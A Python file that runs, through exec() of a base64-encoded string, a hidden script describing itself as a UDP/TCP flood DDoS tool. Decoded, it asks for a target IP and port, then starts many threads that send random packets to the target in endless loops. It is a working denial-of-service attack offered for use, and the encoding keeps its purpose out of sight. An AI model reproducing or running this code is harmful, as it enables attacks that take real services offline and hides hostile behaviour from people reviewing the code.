import base64
exec(base64.b64decode('IiIiClVEUCBGbG9vZGVyLgpUT09MIERET1MgQVRUQUNLIEJZIFhBTEJBRE9SLgoiIiIKaW1wb3J0IHNpZ25hbAppbXBvcnQgdGltZQppbXBvcnQgc29ja2V0CmltcG9ydCByYW5kb20KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgc3lzCmltcG9ydCBvcwpmcm9tIG9zIGltcG9ydCBzeXN0ZW0sIG5hbWUKCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludCgiXDAzM1sxOzM0OzQwbSBcbiIpCm9zLnN5c3RlbSgiZmlnbGV0IERET1MgQVRUQUNLIC1mIHNsYW50IikKcHJpbnQoIlwwMzNbMTszNDs0MG0gaWYgeW91IGhhdmUgYW55IGlzc3VlIHBvc3QgYSB0aHJlYWQgb24gaHR0cHM6Ly9naXRodWIuY29tL1hhZmlGb3J0ZXMvUHl0aG9uLVVEUC1GbG9vZC9pc3N1ZVxuIikKCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludCgiXDAzM1sxOzM0OzQwID09PiBDT0RFIEJZIFhBTCBYIFpYIDw9PSAgXG4iKQpwcmludCgiXDAzM1sxOzM0OzQwID09PiBQRU5HR1VOQUFOIEtFVElLIFB5dGhvbi1VRFAtRmxvb2QgPD09ICBcbiIpCnByaW50KCJcMDMzWzE7MzQ7NDAgPT0+IEtBTE8gTUFVIFJFTUFLRSBQTSBHVUEgPD09ICBcbiIpCnByaW50KCJcMDMzWzE7MzQ7NDAgPT0+IERPTlQgQUJVU0UgVE9PTCEhIDw9PSAgXG4iKQoKdGVzdCA9IGlucHV0KCkKaWYgdGVzdCA9PSAibiI6CiAgICBleGl0KDApCmlwID0gc3RyKGlucHV0KCIgSVAgVEFSR0VUOiIpKQpwb3J0ID0gaW50KGlucHV0KCIgUE9SVDoiKSkKY2hvaWNlID0gc3RyKGlucHV0KCIgWU9LIERET1MoeS9uKToiKSkKdGltZXMgPSBpbnQoaW5wdXQoIiBQQUNLRVQ6IikpCnRocmVhZHMgPSBpbnQoaW5wdXQoIiBJU0kgUEFDS0VUOiIpKQpkZWYgcnVuKCk6CiAgICBkYXRhID1yYW5kb20uX3VyYW5kb20oMTAyNCkKICAgIGkgPSByYW5kb20uY2hvaWNlKCgiW1RPSyBUT0sgVE9LXSIsIltUT0sgVE9LIFRPS10iKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pICNpdCdzIHVzaW5nIHRoZSBVRFAgbWV0aG9kIGFzIHlvdSBjYW4gc2VlIGluIFNPQ0tfREdSQU0KICAgICAgICAgICAgYWRkciA9IChzdHIoaXApLGludChwb3J0KSkKICAgICAgICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOgogICAgICAgICAgICAgICAgcy5zZW5kdG8oZGF0YSxhZGRyKQogICAgICAgICAgICBwcmludChpICsiIFBFUk1JU0kgUEFLRVQhISEiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoIlvDl10gU0VSVkVSIElTIERPV04hISEiKQoKZGVmIHJ1bjIoKToKICAgIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTYpCiAgICBpID0gcmFuZG9tLmNob2ljZSgoIltUT0sgVE9LIFRPS10iLCJbVE9LIFRPSyBUT0tdIikpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkgI0FuZCBoZXJlIGl0J3MgdXNpbmcgdGhlIFRDUCBtZXRob2QgYXMgeW91IGNhbiBzZWUgaW4gU09DS19TVFJFQU0KICAgICAgICAgICAgcy5jb25uZWN0KChpcCxwb3J0KSkKICAgICAgICAgICAgcy5zZW5kKGRhdGEpCiAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgICAgICBwcmludChpICsiIFBFUk1JU0kgUEFLRVQhISEiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgICAgIHByaW50KCJbw5ddIFNFUlZFUiBJUyBET1dOISEhIikKCmZvciB5IGluIHJhbmdlKHRocmVhZHMpOgogICAgaWYgY2hvaWNlID09ICd5JzoKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQogICAgICAgIHRoLnN0YXJ0KCkKICAgIGVsc2U6CiAgICAgICAgdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bjIpCiAgICAgICAgdGguc3RhcnQoKQogICAgICAgIApkZWYgbmV3KCk6Cglmb3IgeSBpbiByYW5nZSh0aHJlYWRzKToKCQlpZiBjaG9pY2UgPT0gJ3knOgoJCQl0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQoJCQl0aC5zdGFydCgpCgkJZWxzZToKCQkJdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bjIpCgkJCXRoLnN0YXJ0KCkKCmRlZiB3aGVyZXV3ZXJlKCk6CiAgICBwcmludCgiQXd3IG1hbiwgSSdtIHNvIHNvcnJ5LCBidXQgSSBjYW4ndCByZW1lbWJlciBpZiB1IHdlcmUgaW4gVENQIG9yIFVEUCIpCiAgICBwcmludCgiUHV0IDEgZm9yIFVEUCBhbmQgMiBmb3IgVENQIikKICAgIHdoZXJlbWFuID0gc3RyKGlucHV0KCIgMSBvciAyID46KCIpKQogICAgaWYgd2hlcmVtYW4gPT0gJzEnOgogICAgICAgIHJ1bigpCiAgICBlbHNlOgogICAgICAgIHJ1bjIoKQoKZGVmIGNsZWFyKCk6CgkjIGZvciB3aW5kb3dzCiAgICBpZiBuYW1lID09ICdudCc6CiAgICAgICAgXyA9IHN5c3RlbSgnY2xzJykKCiAgICAjIGZvciBtYWMgYW5kIGxpbnV4KGhlcmUsIG9zLm5hbWUgaXMgJ3Bvc2l4JykKICAgIGVsc2U6CiAgICAgICAgXyA9IHN5c3RlbSgnY2xlYXInKQoKZGVmIGJ5ZWJ5ZSgpOgoJY2xlYXIoKQoJb3Muc3lzdGVtKCJmaWdsZXQgWW91cmUgTGVhdmluZyBTaXIgLWYgc2xhbnQiKQoJc3lzLmV4aXQoMTMwKQoKZGVmIGV4aXRfZ3JhY2VmdWxseShzaWdudW0sIGZyYW1lKToKICAgICMgcmVzdG9yZSB0aGUgb3JpZ2luYWwgc2lnbmFsIGhhbmRsZXIgYXMgb3RoZXJ3aXNlIGV2aWwgdGhpbmdzIHdpbGwgaGFwcGVuCiAgICAjIGluIHJhd19pbnB1dCB3aGVuIENUUkwrQyBpcyBwcmVzc2VkLCBhbmQgb3VyIHNpZ25hbCBoYW5kbGVyIGlzIG5vdCByZS1lbnRyYW50CiAgICBzaWduYWwuc2lnbmFsKHNpZ25hbC5TSUdJTlQsIG9yaWdpbmFsX3NpZ2ludCkKCiAgICB0cnk6CiAgICAgICAgZXhpdGMgPSBzdHIoaW5wdXQoIiBOZ2FwYWluIENsb3NlIExhZ2kgTGFoIDwzID86IikpCiAgICAgICAgaWYgZXhpdGMgPT0gJ3knOgoKICAgICAgICAgICAgYnllYnllKCkKCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoIk9rIG9rLCBxdWl0dGluZyIpCiAgICAgICAgYnllYnllKCkKCiAgICAjIHJlc3RvcmUgdGhlIGV4aXQgZ3JhY2VmdWxseSBoYW5kbGVyIGhlcmUKICAgIHNpZ25hbC5zaWduYWwoc2lnbmFsLlNJR0lOVCwgZXhpdF9ncmFjZWZ1bGx5KQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgICMgc3RvcmUgdGhlIG9yaWdpbmFsIFNJR0lOVCBoYW5kbGVyCiAgICBvcmlnaW5hbF9zaWdpbnQgPSBzaWduYWwuZ2V0c2lnbmFsKHNpZ25hbC5TSUdJTlQpCiAgICBzaWduYWwuc2lnbmFsKHNpZ25hbC5TSUdJTlQsIGV4aXRfZ3JhY2VmdWxseSk='))